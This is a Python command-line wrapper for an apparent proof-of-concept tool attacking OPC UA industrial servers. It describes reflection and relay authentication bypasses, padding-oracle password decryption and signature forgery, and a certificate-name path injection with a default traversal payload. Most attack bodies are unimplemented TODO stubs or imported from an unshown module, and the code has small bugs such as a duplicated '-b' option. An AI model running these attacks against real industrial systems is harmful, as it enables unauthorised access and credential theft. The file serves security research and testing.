#!/usr/bin/env python3

from attacks import *

from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter, Namespace
from abc import ABC
from pathlib import Path


HELP_TEXT = """
Proof of concept tool for attacks against the OPC UA security protocol.
""".strip()

class Attack(ABC):
  """Base class for OPC attack defintions."""
  
  @property
  @abstractmethod
  def subcommand(self) -> str:
    """Command-line subcommand name."""
    ...
    
  @property
  @abstractmethod
  def short_help(self) -> str:
    """Brief description."""
    ...
    
  @property
  @abstractmethod
  def long_help(self) -> str:
    """Extended description."""
    ...
    
  @abstractmethod
  def add_arguments(self, aparser : ArgumentParser):
    """Add attack-specific options."""
    ...
    
  @abstractmethod
  def execute(self, args : Namespace):
    """Executes the attack, given specified options."""
    ...
    
class CheckAttack(Attack):
  subcommand = 'check'
  short_help = 'evaluate whether attacks apply to server'
  long_help = """
Simply requests a list of endpoints from the server, and report which attacks may be applicable based on their 
configuration. This does not prove the endpoints are vulnerable, but helps testing a connection and determining which 
attacks are worth trying.


By default, this will be non-intrusive and only request and endpoint list. When you use --probe-password you can test 
for an additional padding oracle attack method (that may work even if the server had disabled the Basic128Rsa15 
security policy) by executing one login attempt with incorrect credentials.
"""

  def add_arguments(self, aparser):
    aparser.add_argument('-p', '--probe-password', type=FileType('r'),
      help='does a failed login attempt with a PKCS#1 encrypted password')
    
    aparser.add_argument('url',
      help='Target or discovery server OPC URL (either opc.tcp:// or https:// protocol)',
      type=str)
    
  def execute(self, args):
    raise Exception('TODO: implement')

class ReflectAttack(Attack):
  subcommand = 'reflect'
  short_help = 'authentication bypass via reflection attack'
  long_help = """
Log in to an OPC server, pretending to be the server itself by tricking it to 
sign its own nonce.

This works by setting up two sessions to the server. In the first "main" 
session the server's own certificate is supplied in the CreateSessionRequest.
If the server has allowlisted its own certificate (or accepts everyone under
the same CA), it will answer the request with a "nonce" that acts as an 
authentication challenge. Now, the tool will open up a second connection to the
same server and supply this nonce in its CreateSessionRequest. The server will 
answer this as well and set a serverSignature on the nonce. This signature is 
then copied to the ActivateSessionRequest back on the main session, taking 
advantage of the lack of domain separation between client and server signatures.

If the server requires user authentication on top of client instance 
authentication, the same technique is attempted to spoof a user certificate. 
The attack won't work if password-based authentication is required.

The default form of the attack only works against servers that support an HTTPS 
endpoint. If that is not the case, you can use the --bypass-opn flag to try and 
use the RSA PKCS#1 padding oracle (used by 'decrypt' and 'sigforge' 
attacks) to get through the initial OpenSecureChannel handshake. This attack 
will need to perform two full padding oracle decryptions: one for forging a 
signature on a OPN request, and the other to decrypt the response. The result 
of the signature forgery is reusable, while the second needs to take place 
during the lifetime of an authentication token (the duration of which the tool 
will try to maximize).
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    aparser.add_argument('-b', '--bypass-opn', action='store_true',
      help='when no HTTPS is available, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
    aparser.add_argument('-r', '--reusable-opn-file', type=Path, default='.spoofed-opnreqs.json',
      help='file in which to cache OPN requests with spoofed signatures; default: .spoofed-opnreqs.json')
    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
      help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
    
    aparser.add_argument('url',
      help='Target server OPC URL (either opc.tcp:// or https:// protocol)',
      type=str)
    
  def execute(self, args):
    # TODO: padding oracle options
    reflect_attack(args.url, not args.no_demo)
    
class RelayAttack(Attack):
  subcommand = 'relay'
  short_help = 'authentication bypass via relay attack between two servers'
  long_help = """
Tricks one server A to log you in to server B with A's identity.

This uses the same technique as the reflection attack, except that the two
sessions are set up against different servers. See reflect --help for more 
information.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-o', '--forged-opn', type=FileType('r'),
      help='result of a prior opnforge attack against either server')
    aparser.add_argument('-b', '--forged-opn-b', type=FileType('r'),
      help='in case separate forged OPN\'s need to be used for both servers, this one is used for server-b and the -o file is used for server-a')
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents on success; just tell if attack worked')
    aparser.add_argument('-b', '--bypass-opn', action='store_true',
      help='when no HTTPS is available on either or both servers, attempt to use sigforge and decrypt attacks to bypass the opc.tcp secure channel handshake')
    aparser.add_argument('-r', '--reusable-opn-file', type=Path, default='.spoofed-opnreqs.json',
      help='file in which to cache OPN requests with spoofed signatures; default: .spoofed-opnreqs.json')
    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
      help='which PKCS#1 padding oracle to use with --bypass-opn; default: try-both')
    
    
    aparser.add_argument('server-a', 
      help='OPC URL of the server of which to spoof the identity', 
      type=str)
    aparser.add_argument('server-b', 
      help='OPC URL of the server on which to log in as server-a', 
      type=str)
    
  def execute(self, args):
    # TODO: padding oracle options
    relay_attack(getattr(args, 'server-a'), getattr(args, 'server-b'), not args.no_demo)
    
class PathInjectAttack(Attack):
  subcommand = 'cn-inject'
  short_help = 'path injection via an (untrusted) certificate CN'
  long_help = """
Tries to connect with a self-signed client instance certificate that has a path
injection (or other) payload in the Common Name (CN) field. Takes advantage of 
implementations that follow the recommended certificate store directory layout 
(https://reference.opcfoundation.org/GDS/v105/docs/F.1) but don't do additional 
input validation.

You can supply any CN with the --cn flag. By default the payload 
'../../trusted/certs/TestCert' is used, which attempts an authentication bypass 
by getting the rejected cert placed in the trusted store instead. If this 
works, then clearly the server is vulnerable, and you may be able to achieve 
arbitrary file writes and RCE with other payloads.

Supply --second-login to make the tool try a second loginattempt with the same 
certificate, to check whether an authentication bypass payload has worked.
"""

  def add_arguments(self, aparser):
    aparser.add_argument('-c', '--cn', type=str, default='../../trusted/certs/TestCert',
      help='payload to put in CN; default: ../../trusted/certs/TestCert')
    aparser.add_argument('-s', '--second-login', action='store_true',
      help='log in a second time with the same certificate; useful for testing the default payload auth bypass')
    aparser.add_argument('-n', '--no-demo', action='store_true',
      help='don\'t dump server contents when an authentication bypass worked')
    
    
  def execute(self, args):
    raise Exception('TODO: implement')
    
class DecryptAttack(Attack):
  subcommand = 'decrypt'
  short_help = 'sniffed password and/or traffic decryption via an padding oracle'
  long_help = """
If an OPC UA server supports the Basic128Rsa15 policy, or accepts passwords 
encrypted with the "rsa-1_5" algorithm, it is quite likely vulnerable for a 
PKCS#1 padding oracle attack. This allows you to decrypt any RSA ciphertext 
that was encrypted with that server's public key, even when that ciphertext was
using the otherwise secure OAEP padding scheme. To carry out this attack 
you do however need to still be able to connect to this server, and it should 
still be using the same public key.

One use for this is to decrypt passwords that were transmitted over channel 
using 'Sign' or 'None' message security. Another use is to extract channel
encryption session keys by decrypting nonces from the OPN handshake. However,
the latter is only possible if the client-side of the connection is also 
operating as a server, and using the same public key for that purpose.

Currently, the tool only supports decrypting hex-encoded raw payloads (although 
it will attempt to parse a password token if the plaintext looks like one). You
can use Wireshark's "Copy as Hex stream" on 
ActivateSessionRequest -> UserIdentityToken -> UserNameIdentityToken -> Password
to grab a password payload.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
      help='which PKCS#1 padding oracle to use; default: try-both')
    aparser.add_argument('ciphertext', type=str, required=True,
      help='hex-encoded RSA-encrypted ciphertext; either OAEP or PKCS#1')
    aparser.add_argument('server-url', type=str, required=True,
      help='endpoint URL of the OPC UA server owning the RSA key pair the ciphertext was produced for')
    
  def execute(self, args):
    raise Exception('TODO: implement')
  

class SigForgeAttack(Attack):
  subcommand = 'sigforge'
  short_help = 'signature forgery via padding oracle'
  long_help = """
Uses the same padding oracle attack as 'decrypt', but instead of decrypting a
ciphertext an RSA signature is forged with the private key that a server is 
using.

Is used automatically as part of reflect/relay attacks (with --bypass-opn). 
This command can be used to sign any other arbitrary payload. Can be used
to show the concept in isolation or perform some follow-up attack.
""".strip()
  
  def add_arguments(self, aparser):
    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
      help='which PKCS#1 padding oracle to use; default: try-both')
    aparser.add_argument('payload', type=str, required=True,
      help='hex-encoded payload to spoof a signature on')
    aparser.add_argument('server-url', type=str, required=True,
      help='endpoint URL of the OPC UA server whose private key to spoof a signature with')
    
  def execute(self, args):
    raise Exception('TODO: implement')

class MitMAttack(Attack):
  subcommand = 'mitm'
  short_help = 'TODO: active MitM attack on an intercepted client-server connection'
  long_help = """
TODO
""".strip()
  
  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')

class NoAuthAttack(Attack):
  subcommand = 'auth-check'
  short_help = 'tests if server allows unauthenticated access'
  long_help = """
This is not a new attack. Just a simple check to see whether a server allows anonymous access without authentication;
eiter via the None policy or by automatically accepting untrusted certificates. 

This is an easy misconfiguration to make (or insecure default to forget about), so it's good to check for this. Also,
there's not much use for an authentication bypass if no authentication is enforced at all.
"""

  def add_arguments(self, aparser):
    pass
    
  def execute(self, args):
    raise Exception('TODO: implement')

ENABLED_ATTACKS = [ReflectAttack(), RelayAttack()]


def main():
  # Create argument parser for each attack type.
  aparser = ArgumentParser(description=HELP_TEXT, formatter_class=RawDescriptionHelpFormatter)
  subparsers = aparser.add_subparsers(metavar='attack', help='attack to test', required=True)
  for attack in ENABLED_ATTACKS:
    sparser = subparsers.add_parser(attack.subcommand, help=attack.short_help, description=attack.long_help)
    attack.add_arguments(sparser)
    sparser.set_defaults(attack_obj=attack)
    
  # Parse args and execute attack.
  args = aparser.parse_args()
  try:
    args.attack_obj.execute(args)
  except AttackNotPossible as ex:
    print(f'[-] Attack failed: {ex}')
  
  
if __name__ == '__main__':
  main()
